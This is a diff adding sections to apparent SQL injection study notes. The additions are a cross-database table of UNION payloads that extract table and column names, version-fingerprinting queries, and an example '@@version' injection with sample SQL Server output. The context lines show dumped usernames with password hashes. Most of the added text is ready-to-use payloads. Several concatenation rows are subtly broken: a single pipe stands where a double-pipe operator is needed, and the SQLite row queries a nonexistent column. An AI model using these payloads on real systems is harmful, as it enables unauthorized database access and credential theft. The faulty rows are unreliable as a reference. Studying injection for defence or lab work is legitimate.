@@ -269,3 +269,42 @@ With the table and column names known, dump the actual data through the string-c
 - `admin : 5f4dcc3b5aa765d61d8327deb882cf99`
 - `john : 202cb962ac59075b964b07152d234b70`
 ---
+### String Concatenation (Join values from the same row)
+
+| Database        | Function                   | Payload Example                                                                                                   |     |
+| :-------------- | :------------------------- | :---------------------------------------------------------------------------------------------------------------- | --- |
+| **MySQL**       | `CONCAT(a, b, c)`          | `' UNION SELECT CONCAT(table_name, '::', column_name) FROM information_schema.columns WHERE table_name='users'--` |     |
+| **MySQL** (alt) | `CONCAT_WS(sep, a, b)`     | `' UNION SELECT CONCAT_WS(':', table_name, column_name, data_type) FROM information_schema.columns--`             |     |
+| **PostgreSQL**  | `CONCAT(a, b)` or `\|`     | `' UNION SELECT table_name \| '::' \| column_name FROM information_schema.columns WHERE table_name='users'--`     |     |
+| **SQL Server**  | `+` operator or `CONCAT()` | `' UNION SELECT table_name + '::' + column_name FROM information_schema.columns WHERE table_name='users'--`       |     |
+| **Oracle**      | `\|` operator              | `' UNION SELECT table_name\|'::'\|column_name FROM all_tab_columns WHERE table_name='USERS'--`                    |     |
+| **SQLite**      | `\|` operator              | `' UNION SELECT table_name \| '::' \| name FROM pragma_table_info('users')--`                                     |     |
+
+---
+## Querying the Database Type and Version
+
+You can potentially identify both the database type and version by injecting provider-specific queries to see if one works.
+
+### Version Queries by Database Type
+
+|Database Type|Query|
+|:--|:--|
+|Microsoft, MySQL|`SELECT @@version`|
+|Oracle|`SELECT * FROM v$version`|
+|PostgreSQL|`SELECT version()`|
+
+
+### Example UNION Attack
+
+```sql
+' UNION SELECT @@version--
+```
+
+This might return the following output. In this case, you can confirm that the database is Microsoft SQL Server and see the version used:
+
+>Microsoft SQL Server 2016 (SP2) (KB4052908) - 13.0.5026.0 (X64)  
+>Mar 18 2018 09:11:49  
+>Copyright (c) Microsoft Corporation  
+>Standard Edition (64-bit) on Windows Server 2016 Standard 10.0 X64
+
+---
